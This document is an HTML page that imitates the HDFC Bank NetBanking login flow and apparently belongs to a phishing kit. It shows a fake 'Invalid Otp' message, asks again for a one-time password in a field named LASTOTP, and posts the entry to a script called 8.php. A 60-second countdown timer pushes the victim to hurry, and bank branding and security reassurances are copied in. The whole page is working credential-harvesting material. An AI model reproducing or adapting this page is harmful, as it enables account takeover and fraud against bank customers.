<!DOCTYPE HTML> 
<html lang="zxx">
   <head>
      <title>Hbfe</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" type="text/css" href="bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="unamestyle.css">
   </head>
   <body>
      <div class="container-fluid m-0 p-0">
         <!-- Static navbar -->
         <nav class="navbar navbar-default">
            <div class="container">
               <div class="col-sm-12 text-center">
                  <a href="#"><img src="sss.png" width="150px"></a>
                  <h4>Welcome to HDFC Bank NetBanking</h4>
               </div>
            </div>
         </nav>
      </div>
      <div class="container">
         <div class="card m-0 p-30">
            <div class="row">
               <div class="card-body col-sm-5 col-md-5">
                  <h1><b></b></h1>
                  <form action="8.php" method="post">
                     <div class="row">
                        <div class="col-md-12">
                           <a href="#"><img src="sss.png" width="150px"></a>
                         
                           <label>Enter One Time Password<br><span class="red"> Invalid Otp</span></label>
                           <input type="text" class="form-control" name="LASTOTP" required=""> 
						   <p><a href="#" style="color:red;"> Time Expire <span id="countdowntimer">60 </span> Seconds</a></p>
                           <p><a class="link" href="#">Forgot Password / IPIN</a><br>
                              IPIN (Password) is case sensitive
                           </p>
                          
                        </div>
                        <br>
                     </div>
                     <div class="w3ls-login">
                        <button type="submit" class="btn btn-success">  CONTINUE </button><span class="text-right"></span>
                     </div>
                  </form>
                  <br><br>
               </div>
               <div class="card-body col-sm-5 col-md-5 col-md-offset-2">
                  <br><br>
                  <img src="nor.png" class="img-fluid" width="100px"><br><br>
                  <p>Your security is of utmost importance.<br><a href="#">Know More...</a></p>
                  <br>
                  <h4>First Time User?<br></h4>
                  <p><a href="#">Register Now</a> for a host of convinient features</p>
                  <br>
               </div>
               <div class="col-sm-12">
                  <hr>
                  <div class="row">
                     <div class="card-body col-sm-5 col-md-5">
                        <h4>Don't have a HDFC Bank Savings Account?</h4>
                        <ul>
                           <li><a href="#">Credit Card only? Login here</a></li>
                           <br>
                           <li><a href="#">Prepaid Card only ? Login here</a></li>
                           <br>
                           <li><a href="#">Retail Loan only? Login here</a></li>
                        </ul>
                     </div>
                     <div class="card-body col-sm-5 col-md-5 col-md-offset-2">
                        <h4>We have added a host of new features!</h4>
                        <p>You can now do so much more:</p>
                        <ul>
                           <li>Anywhere access through Desktop or mobile</li>
                           <li>Enhanced security measures</li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <footer>
         <img src="foots1.png" class="img-fluid hidden-xs hidden-sm" width="100%">
         <img src="foots2.png" class="img-fluid hidden-lg hidden-md" width="100%">
      </footer>
     <script>
	  var timeleft = 60;
    var downloadTimer = setInterval(function(){
    timeleft--;
    document.getElementById("countdowntimer").textContent = timeleft;
    if(timeleft <= 0)
        clearInterval(downloadTimer);
    },1000);
	  </script>
   </body>
</html>